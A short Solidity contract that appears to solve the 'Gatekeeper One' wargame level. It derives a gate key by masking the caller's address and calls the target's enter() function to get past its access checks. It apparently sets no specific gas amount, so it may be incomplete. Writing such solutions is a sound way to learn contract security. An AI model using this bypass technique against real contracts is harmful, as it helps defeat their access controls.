//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneHacker {

    IGatekeeper gatekeeper;

    constructor(IGatekeeper _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

    function enterIntoGatekeeper() external {
        bytes8 _gateKey = bytes8(uint64(uint160(msg.sender)) & 0xFFFFFFFF0000FFFF);
        gatekeeper.enter(_gateKey);
    }
}